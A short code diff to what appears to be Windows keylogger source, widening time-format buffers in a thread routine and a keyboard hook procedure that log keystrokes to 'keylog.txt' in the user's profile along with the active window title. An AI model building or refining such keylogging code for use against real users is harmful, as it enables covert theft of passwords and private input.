@@ -49,7 +49,7 @@ DWORD WINAPI ThreadProc(LPVOID lpParamter)
 {
     // 获取用户文件夹
     CHAR szPath[MAX_PATH] = { 0 };
-    CHAR szTimeFormat[0x20] = { 0 };
+    CHAR szTimeFormat[0x50] = { 0 };
     SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, szPath);
     sprintf_s(szPath,"%s/%s",szPath,"keylog.txt");
     //MessageBoxA(0,szPath,0,0);
@@ -107,7 +107,7 @@ DWORD WINAPI ThreadProc(LPVOID lpParamter)
 LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     SYSTEMTIME curLocalTime = { 0 };
-    CHAR szTimeFormat[0x20] = { 0 };
+    CHAR szTimeFormat[0x50] = { 0 };
     CHAR szCurrActiveWin[0x50] = { 0 };
     HWND hCurrActiveWin = GetForegroundWindow();
     
